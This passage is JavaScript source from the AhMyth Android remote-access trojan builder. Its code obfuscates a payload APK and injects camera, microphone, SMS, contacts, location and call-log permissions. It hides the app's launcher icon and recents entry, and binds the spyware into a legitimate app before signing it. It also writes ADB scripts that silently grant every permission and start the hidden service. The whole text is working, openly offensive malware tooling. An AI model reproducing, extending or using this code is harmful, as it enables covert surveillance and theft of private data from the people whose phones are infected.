            delayedLog(`[✗] Error modifying StealthConfig.smali: ${error.message}`, CONSTANTS.logStatus.FAIL);
            throw error;
        }
    }

    // UNCOMMENT ORIGINAL CODE IF PROBLEMS ARISE.
    $appCtrl.GenerateApk = async (apkFolder) => {
        // Apply obfuscation if enabled
        if ($appCtrl.obfuscationOptions && (
            $appCtrl.obfuscationOptions.randomizePackage ||
            $appCtrl.obfuscationOptions.randomizeAppName ||
            $appCtrl.obfuscationOptions.injectJunk ||
            $appCtrl.obfuscationOptions.addMetadata
        )) {
            try {
                delayedLog('[→] Applying obfuscation...', CONSTANTS.logStatus.INFO);
                
                const obfuscationResult = await obfuscator.obfuscate(apkFolder, {
                    randomizePackage: $appCtrl.obfuscationOptions.randomizePackage,
                    randomizeAppName: $appCtrl.obfuscationOptions.randomizeAppName,
                    randomizeVersion: $appCtrl.obfuscationOptions.randomizeVersion,
                    injectJunk: $appCtrl.obfuscationOptions.injectJunk,
                    junkCount: 10,
                    addMetadata: $appCtrl.obfuscationOptions.addMetadata,
                    customPackage: $appCtrl.obfuscationOptions.customPackage,
                    customAppName: $appCtrl.obfuscationOptions.customAppName
                });
                
                if (obfuscationResult.success) {
                    obfuscationResult.changes.forEach(change => {
                        delayedLog(`[✓] ${change}`, CONSTANTS.logStatus.SUCCESS);
                    });
                    if (obfuscationResult.newPackageName) {
                        delayedLog(`[ℹ] New package: ${obfuscationResult.newPackageName}`, CONSTANTS.logStatus.INFO);
                    }
                    if (obfuscationResult.newAppName) {
                        delayedLog(`[ℹ] New app name: ${obfuscationResult.newAppName}`, CONSTANTS.logStatus.INFO);
                    }
                } else {
                    delayedLog(`[⚠] Obfuscation warning: ${obfuscationResult.error}`, CONSTANTS.logStatus.WARNING);
                }
            } catch (obfError) {
                delayedLog(`[⚠] Obfuscation error: ${obfError.message}`, CONSTANTS.logStatus.WARNING);
            }
        }
        
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[→] Reading payload manifest file...', CONSTANTS.logStatus.INFO);
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                delayedLog('[→] Parsing manifest XML data...', CONSTANTS.logStatus.INFO);
                const parsedData = await new Promise((resolve, reject) => {
                    xml2js.parseString(data, (parseError, parsedData) => {
                        if (parseError) {
                            reject(parseError);
                        } else {
                            resolve(parsedData);
                        }
                    });
                });

                delayedLog('[→] Injecting selected permissions...', CONSTANTS.logStatus.INFO);
                parsedData.manifest['uses-permission'] = [];
                parsedData.manifest['uses-feature'] = [];

                // Add new permissions and features based on selectedPermissions
                selectedPermissions.forEach(permission => {
                    if (permission === 'android.hardware.camera') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera'
                            }
                        });
                    }

                    if (permission === 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera.autofocus'
                            }
                        });
                    }

                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                        parsedData.manifest['uses-permission'].push({
                            $: {
                                'android:name': permission
                            }
                        });
                    }
                });

                // Apply stealth options
                if ($appCtrl.stealthOptions) {
                    delayedLog('[→] Applying stealth options...', CONSTANTS.logStatus.INFO);
                    
                    // Find the MainActivity in the manifest
                    if (parsedData.manifest.application && parsedData.manifest.application[0]) {
                        const app = parsedData.manifest.application[0];
                        
                        // Hide from recents - add excludeFromRecents to all activities
                        if ($appCtrl.stealthOptions.hideFromRecents && app.activity) {
                            app.activity.forEach(activity => {
                                activity.$['android:excludeFromRecents'] = 'true';
                                activity.$['android:noHistory'] = 'true';
                            });
                            delayedLog('[✓] Hide from recents enabled', CONSTANTS.logStatus.SUCCESS);
                        }
                        
                        // Hide app icon - remove LAUNCHER category from MainActivity
                        if ($appCtrl.stealthOptions.hideIcon && app.activity) {
                            app.activity.forEach(activity => {
                                if (activity['intent-filter']) {
                                    activity['intent-filter'].forEach(filter => {
                                        if (filter.category) {
                                            // Remove LAUNCHER category
                                            filter.category = filter.category.filter(cat => 
                                                cat.$['android:name'] !== 'android.intent.category.LAUNCHER'
                                            );
                                            // Keep only DEFAULT category or add it
                                            if (filter.category.length === 0) {
                                                filter.category = [{ $: { 'android:name': 'android.intent.category.DEFAULT' } }];
                                            }
                                        }
                                    });
                                }
                            });
                            delayedLog('[✓] App icon hidden from launcher', CONSTANTS.logStatus.SUCCESS);
                        }
                    }
                }

                // Convert the parsed data back to XML
                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.ahmythApkFolderPath,
                        'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );

            } catch (error) {
                delayedLog('[✗] Error processing payload manifest!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error);
                delayedLog(`[ℹ] Error details saved to: ${logPath}`, CONSTANTS.logStatus.INFO);
                return;
            }
        }
        
        // Apply stealth and permission options to StealthConfig.smali (for both bound and non-bound APKs)
        try {
            await applyStealthConfigToSmali(apkFolder);
        } catch (stealthError) {
            delayedLog(`[⚠] Warning: Could not modify StealthConfig: ${stealthError.message}`, CONSTANTS.logStatus.WARNING);
            // Continue with build even if stealth config modification fails
        }

        try {
            delayedLog('[→] Clearing Apktool framework directory...', CONSTANTS.logStatus.INFO);
            execCallback('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        // Build the AhMyth Payload APK
        delayedLog(`[→] Building ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
        var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
            CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
        execCallback(createApk,
            (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[✗] Build process failed!', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Building');
                    delayedLog(`[ℹ] Error details saved to: ${logPath}/Building.log`, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog(`[→] Signing ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
                var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                execCallback(signApk, (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[✗] Signing process failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Signing');
                        delayedLog(`[ℹ] Error details saved to: ${logPath}/Signing.log`, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                        if (err) throw err;

                        delayedLog('[✓] Payload built successfully!', CONSTANTS.logStatus.SUCCESS);
                        const signedApkPath = dir.join(outputPath, CONSTANTS.signedApkName);
                        delayedLog('[ℹ] Output location:', CONSTANTS.logStatus.INFO);
                        delayedLog(`    └─ ${signedApkPath}`, CONSTANTS.logStatus.INFO);
                        // Store the output path for easy access
                        $appCtrl.lastBuiltApkPath = signedApkPath;
                        $appCtrl.lastOutputFolder = outputPath;
                        
                        // Offer to open the output folder automatically
                        try {
                            delayedLog('[→] Opening output folder...', CONSTANTS.logStatus.INFO);
                            if (shell && shell.showItemInFolder) {
                                shell.showItemInFolder(signedApkPath);
                            }
                        } catch (e) {
                            console.warn('Failed to open output folder:', e);
                        }
                        
                        // Generate ADB script for silent permissions if enabled
                        if ($appCtrl.silentPermOptions && $appCtrl.silentPermOptions.generateAdbScript) {
                            generateAdbPermissionScript(outputPath);
                        }
                        
                        delayedLog('');

                        fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                            if (err) throw err;
                        });
                    });
                });
            });
    };
    
    // Generate ADB script to grant all permissions silently
    function generateAdbPermissionScript(outputPath) {
        const packageName = 'ahmyth.mine.king.ahmyth';
        const permissions = CONSTANTS.permissions.filter(p => 
            !p.startsWith('android.hardware.') && 
            p.startsWith('android.permission.')
        );
        
        // Windows batch script
        let batScript = `@echo off
echo ===== AhMyth Silent Permission Granter =====
echo.
echo This script will grant all permissions to the AhMyth payload.
echo Make sure the device is connected via ADB and USB debugging is enabled.
echo.

set PACKAGE=${packageName}

echo [*] Checking device connection...
adb devices
echo.

echo [*] Installing APK (if needed)...
adb install -r -g "${CONSTANTS.signedApkName}"
echo.

echo [*] Granting permissions...
`;
        
        permissions.forEach(perm => {
            batScript += `adb shell pm grant %PACKAGE% ${perm} 2>nul\n`;
        });
        
        batScript += `
echo.
echo [*] Granting special permissions...
adb shell appops set %PACKAGE% SYSTEM_ALERT_WINDOW allow 2>nul
adb shell appops set %PACKAGE% GET_USAGE_STATS allow 2>nul
adb shell appops set %PACKAGE% WRITE_SETTINGS allow 2>nul
adb shell appops set %PACKAGE% REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>nul
adb shell appops set %PACKAGE% MANAGE_EXTERNAL_STORAGE allow 2>nul
adb shell appops set %PACKAGE% RUN_IN_BACKGROUND allow 2>nul
adb shell appops set %PACKAGE% RUN_ANY_IN_BACKGROUND allow 2>nul

echo.
echo [*] Starting the app...
adb shell am start -n %PACKAGE%/%PACKAGE%.MainActivity 2>nul
adb shell am startservice %PACKAGE%/%PACKAGE%.MainService 2>nul

echo.
echo [+] All permissions granted successfully!
echo [!] Note: Some permissions may require manual approval on Android 10+
pause`;
        
        // Unix/Linux shell script
        let shScript = `#!/bin/bash
echo "===== AhMyth Silent Permission Granter ====="
echo ""
echo "This script will grant all permissions to the AhMyth payload."
echo "Make sure the device is connected via ADB and USB debugging is enabled."
echo ""

PACKAGE="${packageName}"

echo "[*] Checking device connection..."
adb devices
echo ""

echo "[*] Installing APK (if needed)..."
adb install -r -g "${CONSTANTS.signedApkName}"
echo ""

echo "[*] Granting permissions..."
`;
        
        permissions.forEach(perm => {
            shScript += `adb shell pm grant $PACKAGE ${perm} 2>/dev/null\n`;
        });
        
        shScript += `
echo ""
echo "[*] Granting special permissions..."
adb shell appops set $PACKAGE SYSTEM_ALERT_WINDOW allow 2>/dev/null
adb shell appops set $PACKAGE GET_USAGE_STATS allow 2>/dev/null
adb shell appops set $PACKAGE WRITE_SETTINGS allow 2>/dev/null
adb shell appops set $PACKAGE REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>/dev/null
adb shell appops set $PACKAGE MANAGE_EXTERNAL_STORAGE allow 2>/dev/null
adb shell appops set $PACKAGE RUN_IN_BACKGROUND allow 2>/dev/null
adb shell appops set $PACKAGE RUN_ANY_IN_BACKGROUND allow 2>/dev/null

echo ""
echo "[*] Starting the app..."
adb shell am start -n $PACKAGE/$PACKAGE.MainActivity 2>/dev/null
adb shell am startservice $PACKAGE/$PACKAGE.MainService 2>/dev/null

echo ""
echo "[+] All permissions granted successfully!"
echo "[!] Note: Some permissions may require manual approval on Android 10+"`;
        
        try {
            fs.writeFileSync(dir.join(outputPath, 'grant_permissions.bat'), batScript);
            fs.writeFileSync(dir.join(outputPath, 'grant_permissions.sh'), shScript);
            delayedLog('[✓] ADB permission scripts generated:', CONSTANTS.logStatus.SUCCESS);
            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
            delayedLog(`[ℹ] Output folder: ${outputPath}`, CONSTANTS.logStatus.INFO);
        } catch (e) {
            delayedLog('[!] Failed to generate ADB scripts', CONSTANTS.logStatus.WARNING);
        }
    }

    // function to create the smali payload directory for storing ahmyth payload directories and files when binding
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[→] Reading decompiled application...', CONSTANTS.logStatus.INFO);
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[✗] Failed to read decompiled application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog(`[ℹ] Error details saved to: ${logPath}/Reading.log`, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[→] Creating ${payloadSmaliFolder} directory...`, CONSTANTS.logStatus.INFO);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[✗] Failed to create ${payloadSmaliFolder} directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[→] Copying payload files to ${payloadSmaliFolder} directory...`, CONSTANTS.logStatus.INFO);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[✗] Copying failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying.log');
                        delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying.log`, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[✗] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying-android.log');
                            delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying-android.log`, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[✗] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying-androidx.log');
                                delayedLog(`[ℹ] Error details saved to: ${logPath}/Copying-androidx.log`, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with APK generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    };
});
